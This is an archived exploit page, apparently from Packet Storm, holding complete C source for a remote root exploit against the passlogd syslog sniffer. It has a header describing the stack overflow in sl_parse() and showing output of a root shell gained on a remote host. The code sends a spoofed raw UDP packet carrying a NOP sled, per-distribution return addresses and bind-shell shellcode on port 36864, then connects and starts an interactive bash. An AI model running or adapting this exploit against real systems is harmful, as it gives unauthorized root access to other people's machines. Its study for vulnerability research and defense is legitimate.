<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0076)http://packetstormsecurity.nl/0304-exploits/0x82-Remote.passlogd_sniff.xpl.c -->
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2800.1141" name=GENERATOR></HEAD>
<BODY><PRE>/*
**
** [*] Title: Remote Multiple Buffer Overflow vulnerability in passlogd sniffer.
** [+] Exploit code: 0x82-Remote.passlogd_sniff.xpl.c
**
** [+] Description --
**
** About:
** passlogd is a purpose-built sniffer for capturing syslog messages in transit.
** This allows for backup logging to be performed on a machine with no open ports. 
** 
** This program is introduced in securityfocus: http://www.securityfocus.com/tools/2076
** 
** Vulnerability can presume as following.
** There is sl_parse() function to 33 lines of 'parse.c' code.
** 
**     __
**         ...
**     77    while(pkt[i] != '&gt;'){
**     78      level[j] = pkt[i]; // This is exploit target.
**     79      i++;
**     80      j++;
**     81    }
**     82    i++;
**         ...
**     --
** 
** Visual point that change flowing of this program,
** happen after overwrited stack variables.
** Of course, frame pointer overrun exists together.
** 
** [+] Vulnerable Packages --
** 
** Vendor site: http://www.morphine.com/src/passlogd.html
** 
** passlogd v0.1d
** -passlogd-0.1d.tar.gz
** +FreeBSD
** +OpenBSD
** +Linux
** +Other
** passlogd v0.1c
** -passlogd-0.1c.tar.gz
** passlogd v0.1b
** -passlogd-0.1b.tar.gz
** passlogd v0.1a
** -passlogd-0.1a.tar.gz
** 
** [+] Exploit --
** 
** Our proof of concept code was completed.
** Exhibit it sooner or later.
** 
** exploit result: --
** 
** bash-2.04# ./0x82-Remote.passlogd_sniff.xpl -h61.37.xxx.xx -t2
** 
**  passlogd sniffer remote buffer overflow root exploit
**                                         by Xpl017Elz.
** 
**  [0] Set packet code size.
**  [1] Set protocol header.
**  [2] Make shellcode.
**  [3] Set rawsock.
**  [4] Send packet.
**  [5] Trying 61.37.xxx.xx:36864.
**  [*] Connected to 61.37.xxx.xx:36864.
**  [*] Executed shell successfully !
** 
** Linux blah 2.4.20 #1 SMP Fri Mar 21 20:36:58 EST 2003 i686 unknown
** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
** [root@blah /passlogd-0.1d]#
**
** -- 
** exploit by "you dong-hun"(Xpl017Elz), &lt;szoahc@hotmail.com&gt;. 
** My World: http://x82.i21c.net &amp; http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** This exploit is proof of concept. (Therefore, don't support 'Brute-force' mode.)
**
** P.S:
**
** I now, system OS is lacking. :-l
** Although very appreciative people sent account to me.
** uid=0 of this exploit need urgently. hehehe!
**
** Thank you.
**
*/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/udp.h&gt;

struct os {
	int num;
	char *ost;
	u_long shell;
	int l_sz;
};

#define Xpl017Elz x82
#define D_M (0)
struct os plat[]=
{
	{
		0,"ALZZA Linux release 6.1 (Linux One)",
		/* It's Korean Linux */
		0xbfffaf82,545
	},
	{
		1,"WOW Linux release 6.2 (Puberty)",
		/* It's Korean Linux */
		0xbfffaf82,545
	},
	{
		2,"RedHat Linux release 7.0 (Guinness)",
		/* It's my redhat that exist uniquely. */
		0xbfffae82,581
	},
	{
		3,"WOWLiNUX Release 7.1 (Paran)",
		/* It's Korean Linux */
		0xbfffae82,593
	},
	{
		4,"RedHat Linux release 8.0 (Psyche)",
		/* It's not to me now. (C0mming s00n) */
		0x82828282,0 // shit.
	},
	{
		5,NULL,0,0
	}
};

void banrl();
int setsock(char *host,int port);
void re_connt(int sock);
void send_recv_sh(int sock);
void usage(char *p_name);
int make_sh(u_long shcode,int l_sz);
int main(int argc,char **argv)
{
	int sock,whgl,type=D_M;
	struct hostent *he;
	struct sockaddr_in hehe;
	struct iphdr *__ip_hdr_st;
	struct udphdr *__udp_hdr_st;
#ifdef _TEST
#define FK_IP "82.82.82.82" /* fake src ip */
#else
#define FK_IP "216.239.33.101" /* G00Gl3 */
#endif
	char spoof_ip[0x82]=FK_IP;
#define D_PORT (36864)
	int port=D_PORT;
#define _DMN_NAME
#ifdef _DMN_NAME
#define LC_TEST "localhost" /* default test host */
#else
#define LC_TEST "127.0.0.1" /* localhost */
#endif 
	char host[0x82]=LC_TEST;
#ifdef T_ADDR_
#define SHELL 0x82828282 /* test */
#endif
	u_long shell=plat[type].shell;
	int l_sz=plat[type].l_sz;
	int atk_pk_size,make_sh_size;
	char *__tot_atk_pk,*atk_mbuf;

	(void)banrl();
	if(argc&lt;2)
	{
		(void)usage(argv[D_M]);
	}

	while((whgl=getopt(argc,argv,"L:l:H:h:F:f:T:t:IiS:s:"))!=-1)
	{
		extern char *optarg;
		switch(whgl)
		{
			case 'H':
			case 'h':
				memset((char *)host,D_M,sizeof(host));
				strncpy(host,optarg,sizeof(host)-1);
				break;
				
			case 'F':
			case 'f':
				memset((char *)spoof_ip,D_M,sizeof(spoof_ip));
				strncpy(spoof_ip,optarg,sizeof(spoof_ip)-1);
				break;
				
			case 'L':
			case 'l':
				l_sz=atoi(optarg);
				break;
				
			case 'T':
			case 't':
				type=atoi(optarg);
				if(type&gt;4)
					(void)usage(argv[D_M]);
				else
				{
					shell=plat[type].shell;
					l_sz=plat[type].l_sz;
				}
				break;
				
			case 'S':
			case 's':
				shell=strtoul(optarg,NULL,NULL);
				break;
				
			case 'I':
			case 'i':
				(void)usage(argv[D_M]);
				break;
				
			case '?':
				fprintf(stderr," Try `%s -i' for more information.\n\n",argv[D_M]);
				exit(-1);
				break;
		}
	}
	{
	    	fprintf(stdout," [0] Set packet code size.\n");
		make_sh_size=strlen((char *)make_sh(shell,l_sz));
		atk_pk_size=(sizeof(struct iphdr)+
				sizeof(struct udphdr)+make_sh_size);
		__tot_atk_pk=(char *)malloc(atk_pk_size);
		memset((char *)__tot_atk_pk,D_M,atk_pk_size);
		atk_mbuf=(sizeof(struct iphdr)+
				sizeof(struct udphdr)+
				(char *)__tot_atk_pk);
		fprintf(stdout," [1] Set protocol header.\n");
		__ip_hdr_st=(struct iphdr *)__tot_atk_pk;
		__udp_hdr_st=(struct udphdr *)(sizeof(struct iphdr)+__tot_atk_pk);
		fprintf(stdout," [2] Make shellcode.\n");
		strncpy(atk_mbuf,(char *)make_sh(shell,l_sz),make_sh_size);
	}

	if((he=gethostbyname(host))==NULL)
	{
		herror(" gethostbyname()");
		exit(-1);
	}
	if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))==-1)
	{
		perror(" socket()");
		exit(-1);
	}
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,"1",sizeof("1"))==-1)
	{
		perror(" setsockopt()");
		exit(-1);
	}

	fprintf(stdout," [3] Set rawsock.\n");

	__ip_hdr_st-&gt;version=4;
	__ip_hdr_st-&gt;ihl=sizeof(struct iphdr)/4;
	__ip_hdr_st-&gt;tot_len=htons(atk_pk_size);
	__ip_hdr_st-&gt;ttl=0xff;
	__ip_hdr_st-&gt;protocol=IPPROTO_UDP;
	__ip_hdr_st-&gt;saddr=inet_addr(spoof_ip);
	__ip_hdr_st-&gt;daddr=inet_ntoa(*((struct in_addr *)he-&gt;h_addr));

	__udp_hdr_st-&gt;source=htons(0x82);
	__udp_hdr_st-&gt;dest=htons(0x202);
	__udp_hdr_st-&gt;len=(atk_pk_size);

	hehe.sin_family=AF_INET;
	hehe.sin_port=__udp_hdr_st-&gt;dest;
	hehe.sin_addr=*((struct in_addr *)he-&gt;h_addr);
	memset(&amp;(hehe.sin_zero),D_M,(8));
	
	fprintf(stdout," [4] Send packet.\n");

	if((sendto(sock,__tot_atk_pk,atk_pk_size,D_M,(struct sockaddr *)&amp;hehe,sizeof(struct sockaddr)))==-1)
	{
		perror(" sendto()");
		exit(-1);
	}

	fprintf(stdout," [5] Trying %s:%d.\n",host,port);
	sleep(2);
	sock=(int)setsock(host,port);
	(void)re_connt(sock);
	
	fprintf(stdout," [*] Connected to %s:%d.\n",host,port);
	(void)send_recv_sh(sock);
}

int make_sh(u_long shcode,int l_sz)
{
	int plus_sz_plus=D_M,pk_sz=D_M;
	char shell_code_bind_36864[]={
		/* bindshell port 36864 */
		0xeb,0x72,0x5e,0x29,0xc0,0x89,0x46,0x10,
		0x40,0x89,0xc3,0x89,0x46,0x0c,0x40,0x89,
		0x46,0x08,0x8d,0x4e,0x08,0xb0,0x66,0xcd,
		0x80,0x43,0xc6,0x46,0x10,0x10,0x66,0x89,
		0x5e,0x14,0x88,0x46,0x08,0x29,0xc0,0x89,
		0xc2,0x89,0x46,0x18,0xb0,0x90,0x66,0x89,
		0x46,0x16,0x8d,0x4e,0x14,0x89,0x4e,0x0c,
		0x8d,0x4e,0x08,0xb0,0x66,0xcd,0x80,0x89,
		0x5e,0x0c,0x43,0x43,0xb0,0x66,0xcd,0x80,
		0x89,0x56,0x0c,0x89,0x56,0x10,0xb0,0x66,
		0x43,0xcd,0x80,0x86,0xc3,0xb0,0x3f,0x29,
		0xc9,0xcd,0x80,0xb0,0x3f,0x41,0xcd,0x80,
		0xb0,0x3f,0x41,0xcd,0x80,0x88,0x56,0x07,
		0x89,0x76,0x0c,0x87,0xf3,0x8d,0x4b,0x0c,
		0xb0,0x0b,0xcd,0x80,0xe8,0x89,0xff,0xff,
		0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
	};
	char sh_data_align_4[0x400];
#define NULL_NULL_PSH 0x00
	memset((char *)sh_data_align_4,NULL_NULL_PSH,sizeof(sh_data_align_4));
#define NOP_NOP_PSH 0x90
	for(pk_sz=D_M;pk_sz&lt;l_sz;pk_sz++)
		sh_data_align_4[pk_sz]=NOP_NOP_PSH;
	{
		sh_data_align_4[pk_sz++]=(shcode&gt;&gt;0)&amp;0xff;
		sh_data_align_4[pk_sz++]=(shcode&gt;&gt;8)&amp;0xff;
		sh_data_align_4[pk_sz++]=(shcode&gt;&gt;16)&amp;0xff;
		sh_data_align_4[pk_sz++]=(shcode&gt;&gt;24)&amp;0xff;
		sh_data_align_4[pk_sz++]=(0x3e);
	}
	for(plus_sz_plus=D_M;
		plus_sz_plus&lt;sizeof(sh_data_align_4)-
		strlen(sh_data_align_4)-
		strlen(shell_code_bind_36864);
		plus_sz_plus++)
		sh_data_align_4[pk_sz++]=NOP_NOP_PSH;
	for(plus_sz_plus=D_M;
		plus_sz_plus&lt;strlen(shell_code_bind_36864);
		plus_sz_plus++)
		sh_data_align_4[pk_sz++]=shell_code_bind_36864[plus_sz_plus];
	return strdup(sh_data_align_4);
}

int setsock(char *hostip,int port)
{
	int sock;
	struct hostent *he;
	struct sockaddr_in x82;
	
	if((he=gethostbyname(hostip))==NULL)
	{
		return(-1);
	}
	if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
	{
		return(-1);
	}
	x82.sin_family=AF_INET;
	x82.sin_port=htons(port);
	x82.sin_addr=*((struct in_addr *)he-&gt;h_addr);
	memset(&amp;(x82.sin_zero),0,8);

	if(connect(sock,(struct sockaddr *)&amp;x82,sizeof(struct sockaddr))==-1)
	{
		return(-1);
	}
	return(sock);
}

void re_connt(int sock)
{
	if(sock==-1)
	{
		fprintf(stderr," [-] Connect Failed.\n\n");
		exit(-1);
	}
}

void send_recv_sh(int sock)
{
	int pk;
	struct timeval tm;
	char *t_cmd="uname -a;id;exec bash -i\n";
	char rbuf[1024];
	fd_set rset;
	memset((char *)rbuf,D_M,sizeof(rbuf));
	fprintf(stdout," [*] Executed shell successfully !\n\n");
	send(sock,t_cmd,strlen(t_cmd),D_M);

	tm.tv_sec=10;
	tm.tv_usec=D_M;
	
	while(1)
	{
		fflush(stdout);
		FD_ZERO(&amp;rset);
		FD_SET(sock,&amp;rset);
		FD_SET(STDIN_FILENO,&amp;rset);

		select(sock+1,&amp;rset,NULL,NULL,&amp;tm);

		if(FD_ISSET(sock,&amp;rset))
		{
			pk=read(sock,rbuf,sizeof(rbuf)-1);
			if(pk&lt;=D_M)
			{
				fprintf(stdout," [*] Happy-Exploit\n\n");
				exit(D_M);
			}
			rbuf[pk]=D_M;
			fprintf(stdout,"%s",rbuf);
		}
		if(FD_ISSET(STDIN_FILENO,&amp;rset))
		{
			pk=read(STDIN_FILENO,rbuf,sizeof(rbuf)-1);
			if(pk&gt;D_M)
			{
				rbuf[pk]=D_M;
				write(sock,rbuf,pk);
			}
		}
	}
	return;
}

void usage(char *p_name)
{
	int r_s=D_M;
	fprintf(stdout," Usage: %s -option [argument]\n",p_name);
	fprintf(stdout,"\n\t-h - hostname.\n");
	fprintf(stdout,"\t-f - spoof src ip.\n");
	fprintf(stdout,"\t-s - &amp;shellcode.\n");
	fprintf(stdout,"\t-l - buf len.\n");
	fprintf(stdout,"\t-t - target number.\n");
	fprintf(stdout,"\t-i - help information.\n\n");
	fprintf(stdout," Select target number:\n\n");

	for(;;)
	{
		if(plat[r_s].ost==NULL)
			break;
		else fprintf(stdout,"\t{%d} %s\n",plat[r_s].num,plat[r_s].ost);
		r_s++;
	}
	fprintf(stdout,"\n Example&gt; %s -h localhost -f82.82.82.82 -t3",p_name);
	fprintf(stdout,"\n Example2&gt; %s -h localhost -s0x82828282 -l582\n\n",p_name);
	exit(-1);
}

void banrl()
{
	fprintf(stdout,"\n passlogd sniffer remote buffer overflow root exploit\n");
	fprintf(stdout,"                                        by Xpl017Elz.\n\n");
}

/* eox */

--


-- 
_______________________________________________
Get your free email from http://www.hackermail.com

Powered by Outblaze
</PRE></BODY></HTML>